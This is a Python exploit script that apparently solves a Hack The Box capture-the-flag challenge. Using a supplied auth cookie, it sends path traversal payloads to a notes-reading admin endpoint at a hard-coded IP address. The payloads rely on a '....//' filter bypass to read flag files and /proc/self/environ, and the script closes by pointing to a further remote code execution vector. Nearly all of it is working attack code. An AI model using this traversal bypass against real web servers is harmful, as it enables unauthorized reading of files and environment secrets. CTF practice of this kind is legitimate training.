import requests
import sys
import json

# Check args
if len(sys.argv) < 2:
    print("Usage: python3 get_flag.py <COOKIE_VALUE>")
    print("Example: python3 get_flag.py 5f4dcc3b5aa765...")
    sys.exit(1)

# Configuration
COOKIE_VALUE = sys.argv[1]
TARGET_IP = "http://154.57.164.76:32079"
URL = f"{TARGET_IP}/admin/notes/read"

print(f"[*] Attacking with cookie: {COOKIE_VALUE[:10]}...")

# 1. Setup Session
session = requests.Session()
session.cookies.set("santa_auth", COOKIE_VALUE)

# 2. Define Payloads
# The base directory is 'notes/', so we need to go up to find the flag.
# We use the filter bypass: "....//" -> "../"
payloads = [
    "....//flag.txt",               # Flag in app root
    "....//flag",                   # Flag in app root (no extension)
    "....//....//flag.txt",         # Flag in parent
    "....//....//....//flag.txt",   # Flag in system root
    "....//....//....//flag",       # Flag in system root (common in Docker)
    "....//....//....//proc/self/environ" # Environment vars (often holds flag)
]

# 3. Hunt for the flag
for payload in payloads:
    print(f"[*] Trying payload: {payload}")
    try:
        # The 'id' parameter is where the traversal happens
        resp = session.get(URL, params={"id": payload})

        if resp.status_code == 200:
            try:
                data = resp.json()
                # The code treats the first line of the file as the "Title"
                # If the flag is the only line, it will be in 'title'
                content = data.get('title', '') + "\n" + data.get('content', '')

                if "HTB" in content or "flag" in content.lower():
                    print("\n" + "!" * 40)
                    print(f"[+] FLAG FOUND at {payload}!")
                    print("!" * 40)
                    print(content.strip())
                    print("!" * 40)
                    sys.exit(0)
                else:
                    print(f"[+] File found, but no flag. Content preview: {content[:50]}...")
            except:
                print(f"[+] Raw response (not JSON): {resp.text[:100]}")
        elif resp.status_code == 404:
            print("[-] File not found")
        elif resp.status_code == 403:
            print("[-] Auth failed (Cookie invalid?)")
            sys.exit(1)

    except Exception as e:
        print(f"[-] Error: {e}")

print("[-] Exploit finished. If you didn't see the flag, try looking for the 'WriteNote' RCE vector.")